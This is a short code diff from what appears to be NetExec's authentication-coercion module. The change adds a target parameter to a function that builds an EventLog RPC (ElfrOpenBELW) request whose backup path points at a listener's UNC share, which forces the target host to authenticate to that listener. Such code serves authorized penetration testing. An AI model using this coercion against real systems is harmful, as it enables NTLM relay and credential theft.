@@ -4,7 +4,7 @@ from impacket.dcerpc.v5.dtypes import NULL
 from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = ElfrOpenBELW()
     request["UNCServerName"] = NULL  # '%s\x00' % listener
     request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
